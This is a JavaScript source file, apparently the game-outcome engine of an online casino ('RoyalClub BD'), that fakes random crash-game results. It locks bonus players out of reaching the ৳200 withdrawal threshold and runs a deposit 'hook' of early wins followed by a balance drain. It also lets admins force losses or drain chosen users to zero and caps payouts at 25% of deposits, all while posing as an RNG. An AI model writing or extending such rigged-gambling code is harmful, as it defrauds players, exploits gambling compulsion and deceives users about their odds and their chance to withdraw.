/**
 * RoyalClub BD - Advanced House Edge, Dynamic Profit Protection & Smart RNG Engine
 * Implements:
 * 1. Condition A: No-Deposit Bonus Cap (Max ৳199 balance, ৳200 withdrawal lockout, 0-5% drain)
 * 2. Condition B: Deposit Hook (First 8-10 spins 65-70% RTP up to ~৳160, then progressive drain)
 * 3. Condition C: 75% Global & Hourly House Profit Retention
 * 4. 1-Click Target User Manipulation (Normal, Force Win, Force Loss, Drain to Zero, Custom RTP)
 */

export function calculateOutcome({
  user = {},
  gameId = 'aviator',
  betAmount = 10,
  platformSettings = {},
  serverType = 'SPRIBE',
  recentPlatformStats = { totalDeposits: 10000, totalWithdrawals: 2000, totalWagered: 50000, totalPayouts: 10000 }
}) {
  const bAmt = Math.max(0.1, Number(betAmount) || 10);
  const currentBalance = Number(user?.balance || 0);
  const totalDeposited = Number(user?.total_deposited || 0);
  const totalWithdrawn = Number(user?.total_withdrawn || 0);
  const spinsSinceDeposit = Number(user?.spins_since_deposit || user?.total_spins || 0);

  // Platform Config Defaults
  const bonusCap = Number(platformSettings?.bonus_balance_cap || 199.00);
  const minWithdraw = Number(platformSettings?.min_withdraw || 200.00);
  const hookSpinsCount = Number(platformSettings?.first_spins_boost_count || 10);
  const globalHouseEdge = Number(platformSettings?.global_house_edge_percent || 75); // 75% House Profit
  const maxAllowedPayoutRatio = (100 - globalHouseEdge) / 100; // 0.25 (25% max payout)

  // Target User Controls
  const forceMode = user?.force_mode || user?.force_result || 'normal'; // 'normal', 'force_win', 'force_loss', 'drain_to_zero'
  const customRtp = user?.custom_rtp !== undefined && user?.custom_rtp !== null && !isNaN(Number(user.custom_rtp))
    ? Number(user.custom_rtp)
    : (user?.custom_win_rate !== undefined && !isNaN(Number(user.custom_win_rate)) ? Number(user.custom_win_rate) : null);

  // -------------------------------------------------------------
  // STEP 1: EXPLICIT ADMIN TARGET OVERRIDES (Highest Priority)
  // -------------------------------------------------------------
  if (forceMode === 'drain_to_zero' || forceMode === 'force_loss') {
    return {
      won: false,
      multiplier: 0,
      payout: 0,
      crashMultiplier: parseFloat((1.00 + Math.random() * 0.10).toFixed(2)), // Crashes between 1.00x and 1.10x
      isMicroWin: false,
      mode: 'ADMIN_DRAIN_LOCKOUT',
      reason: 'Admin strictly set force loss / drain to zero'
    };
  }

  if (forceMode === 'force_win') {
    const winMult = parseFloat((1.25 + Math.random() * 0.45).toFixed(2)); // 1.25x - 1.70x
    const payout = parseFloat((bAmt * winMult).toFixed(2));
    return {
      won: true,
      multiplier: winMult,
      payout,
      crashMultiplier: parseFloat((winMult + 0.35 + Math.random() * 0.50).toFixed(2)),
      isMicroWin: false,
      mode: 'ADMIN_FORCE_WIN',
      reason: 'Admin strictly set force win'
    };
  }

  // -------------------------------------------------------------
  // STEP 2: CONDITION A - NO-DEPOSIT BONUS CAP (total_deposited === 0)
  // -------------------------------------------------------------
  if (totalDeposited === 0) {
    // If balance is already near the cap (৳180 - ৳199), OR any win could reach ৳200 (minWithdraw)
    const isNearWithdrawThreshold = currentBalance >= 175 || (currentBalance + bAmt * 1.5) >= minWithdraw;

    if (isNearWithdrawThreshold || currentBalance >= bonusCap) {
      // STRICT HARD LOCKOUT: Force Loss, 0%-5% RTP, drain to ৳0.00
      const drainRoll = Math.random() * 100;
      const isDrainWin = drainRoll < 4; // Only 4% micro-win to keep playing
      
      if (isDrainWin && (currentBalance + bAmt * 0.4) < bonusCap) {
        const microMult = 0.4;
        return {
          won: true,
          multiplier: microMult,
          payout: parseFloat((bAmt * microMult).toFixed(2)),
          crashMultiplier: 1.18,
          isMicroWin: true,
          mode: 'NO_DEPOSIT_DRAIN_MICRO',
          reason: 'Bonus player balance near ৳199 cap; micro drain active'
        };
      }

      // Default: Strict Loss & Instant Aviator Crash
      return {
        won: false,
        multiplier: 0,
        payout: 0,
        crashMultiplier: parseFloat((1.00 + Math.random() * 0.08).toFixed(2)), // 1.00x - 1.08x instant crash
        isMicroWin: false,
        mode: 'NO_DEPOSIT_BONUS_CAP_REACHED',
        reason: 'Bonus player reached ৳199 cap; protected from ৳200 withdrawal'
      };
    }

    // Balance is under ৳150: Allow exciting wins (35-45% RTP) to hook the player
    let bonusWinRate = 38;
    if (customRtp !== null) bonusWinRate = customRtp;

    const roll = Math.random() * 100;
    if (roll < bonusWinRate) {
      // Win allowed, but cap payout so balance does not exceed ৳185
      const maxPossibleWin = Math.max(0, 185 - currentBalance);
      let winMult = parseFloat((1.30 + Math.random() * 1.20).toFixed(2)); // 1.30x - 2.50x
      if (bAmt * winMult > maxPossibleWin) {
        winMult = Math.max(1.10, parseFloat((maxPossibleWin / bAmt).toFixed(2)));
      }
      const payout = parseFloat((bAmt * winMult).toFixed(2));
      return {
        won: true,
        multiplier: winMult,
        payout,
        crashMultiplier: parseFloat((winMult + 0.20 + Math.random() * 0.60).toFixed(2)),
        isMicroWin: false,
        mode: 'NO_DEPOSIT_HOOK_PHASE',
        reason: 'Bonus hook phase; balance growing toward ৳150'
      };
    }

    // Loss
    return {
      won: false,
      multiplier: 0,
      payout: 0,
      crashMultiplier: parseFloat((1.05 + Math.random() * 0.20).toFixed(2)),
      isMicroWin: false,
      mode: 'NO_DEPOSIT_NORMAL_PLAY',
      reason: 'Standard bonus gameplay'
    };
  }

  // -------------------------------------------------------------
  // STEP 3: CONDITION B - DEPOSIT HOOK & 75% HOUSE RETENTION (total_deposited > 0)
  // -------------------------------------------------------------
  if (totalDeposited > 0) {
    // Phase 1: First 8-10 spins after deposit
    const isHookPhase = spinsSinceDeposit <= hookSpinsCount && currentBalance < 160;

    if (isHookPhase) {
      // 65% - 70% Generous RTP to hook user, balance climbs to ৳150-৳160
      let hookWinRate = 68;
      if (customRtp !== null) hookWinRate = customRtp;

      const roll = Math.random() * 100;
      if (roll < hookWinRate) {
        // Prevent exceeding ৳165 so user stays under withdrawal threshold
        const maxGain = Math.max(0, 165 - currentBalance);
        let winMult = parseFloat((1.35 + Math.random() * 0.85).toFixed(2)); // 1.35x - 2.20x
        if (bAmt * winMult > maxGain) {
          winMult = Math.max(1.15, parseFloat((maxGain / bAmt).toFixed(2)));
        }
        const payout = parseFloat((bAmt * winMult).toFixed(2));
        return {
          won: true,
          multiplier: winMult,
          payout,
          crashMultiplier: parseFloat((winMult + 0.40 + Math.random() * 0.60).toFixed(2)),
          isMicroWin: false,
          mode: 'DEPOSIT_HOOK_SWEETENER',
          reason: `Deposit hook active (spin ${spinsSinceDeposit}/${hookSpinsCount})`
        };
      }

      return {
        won: false,
        multiplier: 0,
        payout: 0,
        crashMultiplier: parseFloat((1.10 + Math.random() * 0.25).toFixed(2)),
        isMicroWin: false,
        mode: 'DEPOSIT_HOOK_LOSS',
        reason: 'Standard hook loss'
      };
    }

    // Phase 2: Post-Hook House Profit Drain Mode (spins > 10 OR balance >= ৳160)
    // Goal: Prevent user from reaching ৳200 minWithdraw, drain balance toward 0
    let drainWinRate = 12; // 12% win rate
    if (customRtp !== null) drainWinRate = customRtp;

    // If balance is dangerously close to ৳200, strictly kill wins
    if (currentBalance >= 180 || (currentBalance + bAmt * 1.5) >= minWithdraw) {
      return {
        won: false,
        multiplier: 0,
        payout: 0,
        crashMultiplier: parseFloat((1.01 + Math.random() * 0.08).toFixed(2)),
        isMicroWin: false,
        mode: 'DEPOSIT_WITHDRAWAL_DEFENSE',
        reason: 'Balance near ৳200 withdrawal; strict drain triggered'
      };
    }

    const drainRoll = Math.random() * 100;
    if (drainRoll < drainWinRate) {
      // Mostly micro-wins (0.3x - 0.7x bet) to keep user entertained while draining
      const isMicro = Math.random() < 0.75;
      const mult = isMicro 
        ? parseFloat((0.35 + Math.random() * 0.35).toFixed(2)) // 0.35x - 0.70x (net loss)
        : parseFloat((1.15 + Math.random() * 0.25).toFixed(2)); // small 1.2x win

      const payout = parseFloat((bAmt * mult).toFixed(2));
      return {
        won: mult >= 1.0,
        multiplier: mult,
        payout,
        crashMultiplier: parseFloat((mult + 0.20 + Math.random() * 0.30).toFixed(2)),
        isMicroWin: isMicro,
        mode: 'DEPOSIT_DRAIN_MODE',
        reason: 'Post-hook house retention drain active'
      };
    }

    // Clean loss
    return {
      won: false,
      multiplier: 0,
      payout: 0,
      crashMultiplier: parseFloat((1.05 + Math.random() * 0.15).toFixed(2)),
      isMicroWin: false,
      mode: 'DEPOSIT_DRAIN_LOSS',
      reason: 'Post-hook drain loss'
    };
  }

  // -------------------------------------------------------------
  // STEP 4: CONDITION C - 75% GLOBAL PROFIT RETENTION SAFEGUARD
  // -------------------------------------------------------------
  const totalDep = recentPlatformStats.totalDeposits || 10000;
  const totalPay = recentPlatformStats.totalPayouts || 2000;
  const currentPayoutRatio = totalDep > 0 ? (totalPay / totalDep) : 0.20;

  if (currentPayoutRatio >= maxAllowedPayoutRatio) {
    // Platform has paid out 25% or more of deposits: Emergency House Edge Defense
    return {
      won: false,
      multiplier: 0,
      payout: 0,
      crashMultiplier: parseFloat((1.01 + Math.random() * 0.05).toFixed(2)),
      isMicroWin: false,
      mode: 'GLOBAL_75_PERCENT_RETENTION_LOCK',
      reason: 'Platform profit protection: 75% retention threshold triggered'
    };
  }

  // Fallback Baseline
  let baseRtp = 20;
  if (customRtp !== null) baseRtp = customRtp;

  const standardRoll = Math.random() * 100;
  const won = standardRoll < baseRtp;
  const multiplier = won ? parseFloat((1.20 + Math.random() * 1.10).toFixed(2)) : 0;
  const payout = won ? parseFloat((bAmt * multiplier).toFixed(2)) : 0;

  return {
    won,
    multiplier,
    payout,
    crashMultiplier: won ? parseFloat((multiplier + 0.30 + Math.random() * 0.50).toFixed(2)) : parseFloat((1.08 + Math.random() * 0.15).toFixed(2)),
    isMicroWin: false,
    mode: 'BASELINE_RNG',
    reason: 'Standard commercial house edge'
  };
}

export default calculateOutcome;

